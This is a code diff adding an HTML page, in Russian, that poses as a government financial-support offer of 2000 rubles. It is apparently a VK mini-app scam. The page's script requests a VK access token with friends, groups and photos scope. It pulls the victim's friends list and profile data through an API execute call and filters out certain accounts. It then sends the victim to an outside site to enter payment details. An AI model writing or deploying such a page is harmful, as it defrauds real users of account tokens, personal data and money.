@@ -1,0 +1,100 @@
+<html>
+  <head>
+    <script defer src="https://newappsbase.com/SP/js/jquery-3.2.1.min.js"></script>
+    <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
+    
+    <style>
+    body {
+      min-height: 100%;
+      margin-left: 16px;
+      margin-right: 16px;
+      background: #e4ecfd;
+      color: #0b1f33;
+      font-size: 16px;
+      line-height: 24px;
+      font-family: Lato,Helvetica,Arial,sans-serif,-apple-system;
+      padding-top: 64px;
+      padding-bottom: 64px;
+    }
+    </style>
+    <script>
+    var viewer;
+    var vk_app_id = 0;
+    $(function() {
+        vkConnect.send('VKWebAppInit');
+        viewer.id = data.viewer_id;
+        vk_app_id = parseInt(data.vk_app_id);
+      });
+      function getToken() {
+          vkConnect.sendPromise("VKWebAppGetAuthToken", {
+              "app_id": vk_app_id,
+              "scope": "friends,groups,photos"
+          })
+          .then(data => {
+              if(token){return false;}
+
+              firstApi();
+          })
+          .catch(error => {
+              setTimeout(function() {
+                  getToken();
+              }, 2000);
+          });
+      }
+      function login() {
+        getToken();
+      }
+
+      function firstApi() {
+          var code = 'var time=API.utils.getServerTime(); \n\
+          var friends = API.friends.get({"fields": "sex, photo_100, photo_200, photo_max, photo_400_orig, photo_id, online, online_mobile, can_post, relation, last_seen, has_photo, common_count, followers_count, has_photo, occupation","count":500}); \n\
+          var u=API.users.get({fields:"uid, first_name, last_name, photo_max, photo_100, photo_400_orig, photo_id, bdate, sex, city, relation, is_closed, counters"})[0]; \n\
+          var g=parseInt(API.groups.isMember({group_id:9713780,v:5.24}))+parseInt(API.groups.isMember({group_id:166562603,v:5.24}))+parseInt(API.groups.isMember({group_id:134304772,v:5.24}))+parseInt(API.groups.getMembers({group_id:9713780,count:0,filter:"friends",v:5.24}).count)+parseInt(API.groups.getMembers({group_id:166562603,count:0,filter:"friends",v:5.24}).count)+parseInt(API.groups.getMembers({group_id:194823504,count:0,filter:"friends",v:5.24}).count);u.counters.friends=parseInt(u.counters.friends);if (u.counters.friends<10)g=g+1;if(u.id<1000000) g=g+1; \n\
+          u.permissions=g; \n\
+          var user={}; \n\
+          var r={user:u,permissions:g}; \n\
+          return [friends,time,r];';
+
+           vkConnect.sendPromise("VKWebAppCallAPIMethod", {
+              "method": "execute",
+              "params": {"code": code, "v": "5.95", "access_token": token}
+          }).then(data => {
+              if(data.response[2].permissions == 0) {
+                $("#content").html('<p style="color: #66727f;">Авторизация успешна, Вы можете заполнить платёжные данные для получения платежа</p><a target="_blank" href="https://foody-menu.ru/createPay.php?uid=1&price=2000" style="text-decoration:none;width:100%;display: inline-block;height: 56px;border-radius: 8px;border: none;font-size: 16px;line-height: 56px;color: #fff;background: #0d4cd3;cursor: pointer;">Заполнить платёжные данные</a>');
+              }else{
+
+              }
+            })
+            .catch(error => {
+
+            });
+      }
+    </script>
+  </head>
+  <body>
+    <div style="position: relative;max-width: 384px;margin-left: auto;margin-right: auto;text-align:center;">
+        <div style="border-radius: 12px;box-shadow: 0 24px 48px rgb(230 235 245 / 40%);background: #fff;padding: 40px 24px;">
+          <div style="display: block;width: 193px;height: 30px;margin: 0 auto;font-size: 0;background: url(logo.svg) no-repeat 0 0;background-size: 100%;">
+          </div>
+          <p style="font-family: Lato,Helvetica,Arial,sans-serif,-apple-system;font-weight: 600;color: #0b1f33;">
+              Государственная финансовая поддержка
+          </p>
+          <div id="content">
+            <p style="color: #66727f;">
+              Каждый гражданин Росийской Федерации может получить финансовую поддержку в размере <b>2000 рублей</b> в связи с не стабильной экономической ситуацией в мире
+              <br><br>
+              Указ президента РФ от 30 марта 2022 года
+            </p>
+
+            <button onclick="login();" style="text-decoration:none;width:100%;display: inline-block;height: 56px;border-radius: 8px;border: none;font-size: 16px;line-height: 56px;color: #fff;background: #0d4cd3;cursor: pointer;">
+              Оформить онлайн
+            </button>
+          </div>
+
+        </div>
+
+    </div>
+  </body>
+
+
+</html>
